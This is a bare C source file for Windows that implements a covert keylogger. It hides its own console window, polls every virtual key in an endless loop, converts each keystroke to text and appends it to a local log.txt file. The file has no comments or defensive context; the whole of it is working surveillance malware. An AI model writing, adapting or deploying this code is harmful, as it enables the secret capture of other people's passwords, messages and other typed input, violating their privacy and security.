#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void writeLog(char *c, char *fileName);
char *getKey(unsigned char c);

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char logFileName[] = "log.txt";
    unsigned char keyboardState[256] = {0};
    unsigned short buffer[2];
    HKL keyboardLayout = GetKeyboardLayout(0);

 
    while (1) {
        Sleep(10);
        
        for (unsigned short k = 0; k < 256; k++) {
            if ((GetKeyState(k) & 0x8000) && !(k == VK_LCONTROL || k == VK_RCONTROL || k == VK_CONTROL || k == VK_MENU)) 
                keyboardState[k] = 0x80;
            else 
                keyboardState[k] = 0x00;
        }

        for (unsigned short k = 0; k < 256; k++) {
            int keyState = GetAsyncKeyState(k);
            
            if (keyState == -32767 && k != 16 && k != 160 && k != 162 && k != 163 && k != 164 && k != 165) {
                char *str = getKey(k);
                if (!str[0]) {
                    int ret = ToAsciiEx(k, MapVirtualKeyEx(k, 0, keyboardLayout), keyboardState, buffer, 0, keyboardLayout);
                    if (ret == 1) 
                        sprintf(str, "%c", (char)buffer[0]);
                    else if (ret == 2) 
                        sprintf(str, "?");
                    else 
                        sprintf(str, "[%d]", (unsigned short)k);
                }
                writeLog(str, logFileName);

        
            }
        }
        
    }   
    return 0;
}

void writeLog(char *c, char *fileName) {
    FILE *logFile;
    logFile = fopen(fileName, "a+");
    if (logFile != NULL) {
        fprintf(logFile, "%s", c);
        fclose(logFile);
    }
}

char *getKey(unsigned char c) {
    static char str[16];
    switch (c) {
        case VK_SPACE:
            sprintf(str, " ");
            break;
        case VK_RETURN:
            sprintf(str, "\n");
            break;
        case VK_BACK:
            sprintf(str, "⌫");
            break;
        case VK_DELETE:
            sprintf(str, "⌦");
            break;
        case VK_LBUTTON:
            sprintf(str, "[L]");
            break;
        case VK_RBUTTON:
            sprintf(str, "[R]");
            break;
        case VK_MBUTTON:
            sprintf(str, "[M]");
            break;
        case 91: //windows key
            sprintf(str, "❖");
            break;
        case VK_CONTROL:
            sprintf(str, "Ctrl");
            break;
        case VK_MENU:
            sprintf(str, "Alt");
            break;
        case VK_ESCAPE:
            sprintf(str, "Esc");
            break;
        case VK_UP:
            sprintf(str, "↑");
            break;
        case VK_DOWN:
            sprintf(str, "↓");
            break;
        case VK_LEFT:
            sprintf(str, "←");
            break;
        case VK_RIGHT:
            sprintf(str, "→");
            break;
        case VK_F1:
            sprintf(str, "F1");
            break;
        case VK_F2:
            sprintf(str, "F2");
            break;
        case VK_F3:
            sprintf(str, "F3");
            break;
        case VK_F4:
            sprintf(str, "F4");
            break;
        case VK_F5:
            sprintf(str, "F5");
            break;
        case VK_F6:
            sprintf(str, "F6");
            break;
        case VK_F7:
            sprintf(str, "F7");
            break;
        case VK_F8:
            sprintf(str, "F8");
            break;
        case VK_F9:
            sprintf(str, "F9");
            break;
        case VK_F10:
            sprintf(str, "F10");
            break;
        case VK_F11:
            sprintf(str, "F11");
            break;
        case VK_F12:
            sprintf(str, "F12");
            break;
        case VK_INSERT:
            sprintf(str, "Insert");
            break;
        case VK_HOME:
            sprintf(str, "Home");
            break;
        case VK_PRIOR:
            sprintf(str, "PgUp");
            break;
        case VK_END:
            sprintf(str, "End");
            break;
        case VK_NEXT:
            sprintf(str, "Pgdn");
            break;
        case VK_TAB:
            sprintf(str, "Tab");
            break;
        case VK_CAPITAL:
            sprintf(str, "Caps-Lock");
            break;
        case VK_LMENU:
            sprintf(str, "Left-Alt");
            break;
        case VK_RMENU:
            sprintf(str, "Right-Alt");
            break;
        case VK_LCONTROL:
            sprintf(str, "Left-Ctrl");
            break;
        case VK_RCONTROL:
            sprintf(str, "Right-Ctrl");
            break;
        case VK_NUMLOCK:
            sprintf(str, "Num-Lock");
            break;
        case VK_LSHIFT:
            sprintf(str, "Left-Shift");
            break;
        case VK_RSHIFT:
            sprintf(str, "Right-Shift");
            break;
        default:
            str[0] = '\0'; // Empty string for unsupported keys
    }

    return str;
}
